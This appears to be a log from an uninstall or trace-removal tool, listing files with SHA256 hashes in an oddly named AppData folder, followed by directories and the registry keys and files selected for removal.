+  SHA256: 322CDEE2378C15EE4A81A2AA6389483E61B055C9C4C455DAC4D17EEE2400D853
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\chrome_elf.dll
+  SHA256: E012EB68C70282D4D2A02440D32AD6C975B07B75A31C2A068E65FD6F16BC3E96
+
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\column options.bmp
+  SHA256: BCC0C02A6EC0D443D73803823CAA6E6E34E9FBFFE82D8D54AFA742AF0FF89587
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete column.bmp
+  SHA256: 93E22781B25453EDB49345FADCDC3EB18336E69D2B5BA425DD346D9B36A9C490
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete row.bmp
+  SHA256: 7E9A67FE279E9C691E377225ABE8EE53507690DAF44183E716BABF21AFF9F6D6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete.bmp
+  SHA256: D089CA028AC2AC5023E71A566F1D4F92B451752DEF86E8BB960C0FF6ED9B5AF2
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\duplicate.bmp
+  SHA256: B8C2BCC4B83D1C3598694DCABEF1BF0DDD98E3EE66DA83A2B4BC3168F62712EA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\gigjcxobvj.rar
+  SHA256: 76241296846A92767493A3BDA4B80D615371FD39EDDEC7A03BE1F034D608BAD9
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-bash.exe
+  SHA256: 624155444368D5159736E9CCA825850E278D4C0FFA3BBFCB8099ACC318A05B3D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-cmd.exe
+  SHA256: ABC826E4BA8F6ECDD5C0D41DD82265850C8869ACBA14D5D7812E2DB04873A51E
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\guhwjvn.rar
+  SHA256: 6D407F48B3D7B421E727A3B793C93DF5F3CCB5A9D78A538609EC7CFCCAB6F594
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\hide report.bmp
+  SHA256: 8B42D86F2A8693D4EDEB0A3FDD4A18054D01674399702A03B732D320F9085BB6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert column.bmp
+  SHA256: C00189FA68D6F3936102DF62FDF13177A5E8C8094D69DC019E8D95612D8056A5
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert report.bmp
+  SHA256: BBF7D0E278F26B193860206AF9D9C72BD521F0BFF64B7F693673E1541B91C839
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert row.bmp
+  SHA256: 4B22C5AFDA48173FB581D02099E4D5CFEBA1B859431E380F6F5FA6FE1FD24856
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.desktop.jmod
+  SHA256: BE59AC0E673827B731CF5616B41DA11581A5863285FEA1A0696AA4F93796BCC3
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.instrument.jmod
+  SHA256: 4A495FC5D119724F7D40699BB5D2B298B0B87199D09129AEC88BBBDBC279A68D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.logging.jmod
+  SHA256: 584D15427F5B0AC0CE4BE4CAA2B3FC25030A0CF292F890C6D3F35836BC97FA6D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.jmod
+  SHA256: 1C8D9EFAEB087AA474AD8416C3C2E0E415B311D43BCCA3B67CBF729065065F09
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.rmi.jmod
+  SHA256: 27047E3D872637D62DD251A1E7CBE0AE5F1DD1F0F275A06405E6C673421681C6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.naming.jmod
+  SHA256: 734130C3E9D7A12A75BBB194C9FD29DFC85FD802B42B3CCD2C617C86FC905473
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.net.http.jmod
+  SHA256: AF1946B6683575D724430220DB7C948AF2598E69091F74459CCA1F97A15C2A54
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.prefs.jmod
+  SHA256: 43622935A7EF06E30D1BDA7E77CB76488DA9E721728AE0B8ACDB1F9C7B91C943
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.rmi.jmod
+  SHA256: 25FDC4D19B9F9BFF599212307C35ADE3C5B14D8FA326352837E2AC1919A27679
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.scripting.jmod
+  SHA256: BC08974AF0D13B1B362A651329036C24CC54028F1D0B3EB327350B51E2270FA5
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.se.jmod
+  SHA256: 4BD4726EB7772FD1A202DF3EEF6367ED66688E0603C4B970D22AC8EB560F2A04
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.jgss.jmod
+  SHA256: 934114BA650D81262CFE3CFBA0D5A190520C05CDDDCD9A7A875E3E1D951AD71D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.sasl.jmod
+  SHA256: F783A14F1FD9E804553F54E8B97E38A5BEB8C25ADF096FD380FC1BEE391153AA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.smartcardio.jmod
+  SHA256: 0AF33A68F7B71F12FA3B7F27BC69B80A86633F25EB82830076ACFC3170538EC0
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.jmod
+  SHA256: 2A24C132034F0894A0AA38A2DFA546F6D20113783B791EDCC9831DFC144256FA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.rowset.jmod
+  SHA256: 3F55459BE1A9E300D872F712039F975A3C5BCCFDC498CD0A603A465DE8633300
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.transaction.xa.jmod
+  SHA256: D73340591C1D956650175CDF0B12F5523EE5D5644ECDAF663DD7F44EBC28290E
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.crypto.jmod
+  SHA256: 026D61591C17B3ACBF900F3EA676452CC668062116C5B823709AEABBF77AC7B6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.jmod
+  SHA256: F1C275641604A2BE56E559772AA55CBB1CD8EDAE9EC1B51D5B568F9656A157CB
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.accessibility.jmod
+  SHA256: BE8A7293DEADFF4410281D93A0B6E8CAF2ABD08486000F933E2B7794998B0AAA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.aot.jmod
+  SHA256: DE900FCC734F2CE46175DFBAA4C26368452C6049EA96A35F1E27F5CD988C9D3A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.attach.jmod
+  SHA256: 178B1246FA90169F75CC8DED648A88276DD252A28A85F26676777D75D290BB64
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.charsets.jmod
+  SHA256: FAE4A04FB4D9129A524B9230BFD050ACF4B755B5A6E3511877FADE2569EFB478
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\libvlccore.dll
+  SHA256: D55B519477FF7BE1BE5B1B7C6870D6313E3E3BEBB7C9ECE0ECE5992322A33107
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move down.bmp
+  SHA256: A37E249C985417B809CEA95C12194791E4C3CBE8466AD30C9E257DB6A0682C6B
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move left.bmp
+  SHA256: A603FD88099F1750A8A63D13FC9A0B5482491474A01F4EBC47F6F140AB74B722
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move right.bmp
+  SHA256: A4615B719F974075BBA1D807B09B66280ABB43D64C323BCC1E6BF0064E14C4E2
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move up.bmp
+  SHA256: B68648513775B572AE1ABF0F2F8DC7A9443FFF9A35F4CD0C4479688849E47D06
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\msvcp140.dll
+  SHA256: 9FEE6F36547D6F6EA7CA0338655555DBA6BB0F798BC60334D29B94D1547DA4DA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\new project.bmp
+  SHA256: 60BFDFC9E75345A4FD5C722E2497381719E1C3A1943D7A6A708257899A72F2D7
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\npvlc.dll
+  SHA256: 9B08A1C7822A1710C01D38DE6DE74878C20EEAFB1B2C8417B8472EC84AE92E7B
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pencil.bmp
+  SHA256: 93533944518985344DB7F532E201FBA5833CDCBD0A6637C9CC43B4D992C3BC31
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pointer.bmp
+  SHA256: 03962A990EB2359DE6258816EB7EFEDBD75D8AB511DA62AD5B8656078F42A1FF
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5core.dll
+  SHA256: 3880E50AB6E204B9FBC2952FF39411A530612DDCBD82C296D916065F37B755E6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5gui.dll
+  SHA256: 455E4487B294C9648F2F4852AB68BA5D45E880BD1E8CF3D27E58150C2AEDB20C
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\report.bmp
+  SHA256: FA1FB4AE6A51DF3295EDDCAB8D19CB9B0B4139FC78A85DFAEFEF24B501DD2385
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left fast.bmp
+  SHA256: D2C1AB34760E7F424330CFBF0F74EC08DE09AF24ACE55044ACC1FA262AA24BCB
+
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left slow.bmp
+  SHA256: 433444A5738A028C64204156428050A0175700085CCDDDDC559372578D77290E
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right fast.bmp
+  SHA256: 8027E3D587C6FE821D0172C7605FEB515D9E44D9CEE1D1533AB6D9B0D0F4E3B6
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right slow.bmp
+  SHA256: F535EB1349FA5B8B8E03B4BAC1E6A5BE54CC527CC60C6D06E5C29F7690F2E815
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll to task.bmp
+  SHA256: 60A3EA5724E2AEF1766C93A536950ECE7FE30F815B66C3C7A8104DA5660EA0CD
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\show hidden.bmp
+  SHA256: 60A8DB371550D616BEBE903157890498E44E8E171764719E380BFA10D71AF033
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit-updater.exe
+  SHA256: 6708FA90D5C1543D3C42E2EFB274BECD2E97C450FA9669FD3780EF293A9F1E1A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit.exe
+  SHA256: DEF3EBA3D76A81DA41DFFE07B2359D420D83D535B39B71755CF622DFAE82FE3F
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgitc.exe
+  SHA256: 477480D485177A62AEDDC5FC15DDA4F77C32C4FA8D281AC3A6E8348D38761603
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-profile-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-rtlsupport-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-string-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-synch-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-synch-l1-2-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-sysinfo-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-timezone-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-core-util-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-conio-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-convert-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-environment-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-filesystem-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-heap-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-locale-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-math-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-multibyte-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-private-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-process-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-runtime-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-stdio-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-string-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\api-ms-win-crt-time-l1-1-0.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\axvlc.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\cephtmlengine.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\chrome_elf.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\git-bash.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\git-cmd.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\guhwjvn.rar
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\libvlccore.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\msvcp140.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\npvlc.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\qt5core.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\qt5gui.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\smartgit-updater.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\smartgit.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\smartgitc.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\icudtl.dat
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\jvm.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libglesv2.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_autodel_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_bridge_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_chromaprint_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_chromecast_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_cycle_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_delay_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_description_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_display_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_dummy_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_duplicate_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_es_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_gather_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_mosaic_bridge_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_record_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_rtp_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_setid_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_smem_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_standard_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_stats_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\libstream_out_transcode_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out\oneds.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\unrar.exe
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\vcruntime140.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\vcruntime140_1.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\icudtl.dat
+  SHA256: A041E91306596DD024F77CE2890AEDC9CAAEF6409B930755A06DAA9697550EC0
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\jvm.dll
+  SHA256: B30ACCB880B398FC9743A51831A741CE22364FE091AFF9846CF457A772BBE2A2
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libglesv2.dll
+  SHA256: 7E074778EA6335C9769E66057BB87B36B5B783FFE6B056058B6C0DA31EDF00D2
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_autodel_plugin.dll
+  SHA256: 34BFBCC03EE7507575373273BAE51BE42977B9FBC9F6BF362333E1BBAAE47E71
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_bridge_plugin.dll
+  SHA256: 5D6C79492645356C0BAFC2FCA2AAFC21D17F7A5BB9DB8209F3E8FFEDEAC27F15
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromaprint_plugin.dll
+  SHA256: 0B2EC3613E032655D4E2D43EAD38535A659D046420E0ECAA874F1EE5A10F10F0
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromecast_plugin.dll
+  SHA256: 2A2C1B568B95E803C96D3A63000EEE0BE9FF2C7160CD118768176BF539121AEA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_cycle_plugin.dll
+  SHA256: F46CB49D7B177C49B6D01C7B699810E1686CBC922890ACE9F4389DC0B792127A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_delay_plugin.dll
+  SHA256: 120D24770AAFC7D846779D59CAB83B9D6942AEAEFA2BF7C4DD502EBC77F498F3
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_description_plugin.dll
+  SHA256: 2BD8AE09147FB871884AFD760F2E249562DC398B59D13CDA98997BFCF3656112
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_display_plugin.dll
+
+  SHA256: BC6E4AC08EF1F972B605D1215F2DC44436AAC5E892825C86A1684153261976DA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_dummy_plugin.dll
+  SHA256: 7413968053AB16EBF123A1AF97DC9EC7AAC825D7071B1369325A637AF06437A4
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_duplicate_plugin.dll
+  SHA256: 944D7A18DEFC54115E0273EE5D8E77E2CD6D28183AE3AC85FA251E5AC25FFBCB
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_es_plugin.dll
+  SHA256: 29BBFA9B5242C0F0C35910A9970CA853E2F412E978294CDE88E8B45F014D0C19
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_gather_plugin.dll
+  SHA256: 48AD0D37BDF70E9CD6B7F93709E23E81AAD85609B49E94B017F78FDDEA7DC17D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_mosaic_bridge_plugin.dll
+  SHA256: 100E59FDB371942695496A785B94741B5C8D65E7582B3387612000D71B114015
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_record_plugin.dll
+  SHA256: 7D50284A7479E00063F7D1834E95669888502BFC9002FCCF70CD66AD6C3E09C1
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_rtp_plugin.dll
+  SHA256: 50F391A5FAF2148EE68D178AC5BEFFF4F3C44D0063E25019FCB204FC5E996C96
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_setid_plugin.dll
+  SHA256: 3DA008490594B35245578FF3A1809C1A7E3440F88E10E7A6B42C3A4409EFEDAA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_smem_plugin.dll
+  SHA256: 0FC0C28AA99AD09D2FD56934836DAA18EDDCD72BFC00F7D556584E2A99AD076A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_standard_plugin.dll
+  SHA256: 1D34A7FA41E6FE3228B53554C94DAC7470AADBFC6B14C633B46122496D213939
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_stats_plugin.dll
+  SHA256: 69F3560C12FABCB0C0A2A372EFBFDBDF894559B95DE71A331BBE5FE9EB2EB4A8
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_transcode_plugin.dll
+  SHA256: BFF1D90C8238887E0273E6966EE0348C4B316AD0E797C22F2840C00C0CEF952A
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\oneds.dll
+  SHA256: D75B152D14D9815C92E9D7A226797632E205947DD610314763CFC5F693DAFC8D
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\unrar.exe
+  SHA256: E51021F6CB20EFBD2169F2A2DA10CE1ABCA58B4F5F30FBF4BAE931E4ECAAC99B
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140.dll
+  SHA256: 9D2B40F0395CC5D1B4D5EA17B84970C29971D448C37104676DB577586D4AD1B1
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140_1.dll
+  SHA256: 34048ABAA070ECC13B318CEA31425F4CA3EDD133D350318AC65259E6058C8B32
+----------------------------------------------------------------------------------------------
+                                         DIRECTORIES
+----------------------------------------------------------------------------------------------
+
+  EXISTS c:\users\Redacted\appdata\roaming\tioao wesah\niwp app
+  MISSING c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.
+  MISSING c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\sourcedir\appdir:.\stream_out
+  EXISTS c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out
+  EXISTS c:\windows\installer
+Analysis complete in 3.0s.
+Found 509 traces.
+
+----------------------------------------------------------------------------------------------
+                                           REMOVAL
+----------------------------------------------------------------------------------------------
+
+Selected: 189
+
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{70995719-AA9F-40B3-85E9-C46CB738DAAF}\UninstallString
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\InstallProperties
+  c:\windows\installer\a46df.msi
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Usage
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Features
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Patches
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UpgradeCodes\F0E135F81A0A49646BC2A4153F917384\91759907F9AA3B04589E4CC67B83ADFA
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0556755033264C34D9D9BA11BB1E0E5E\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-conio-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0793AB257D9BE4A4496EBCBE77344177\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-heap-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\09CEDD37120E81A468E708F23D436DAD\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgitc.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0E1DBBDC63E812D469CD0B3B44B79813\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-locale-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0F889C2896A8A8747B2D6B687B8FBA62\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-bash.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\15246FD887A4877489F84F0F73AE122C\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-multibyte-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1850CF546DFD0D3438A389643E51EC37\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-rtlsupport-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\18A76D84CA04F3D4EAD635038AD33245\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\msvcp140.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\18F85C434FB5B13439B2EF58E1346F0C\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1AFAF7B5D0D0BAC40964A7D9DB9F4DD0\91759907F9AA3B04589E4CC67B83ADFA
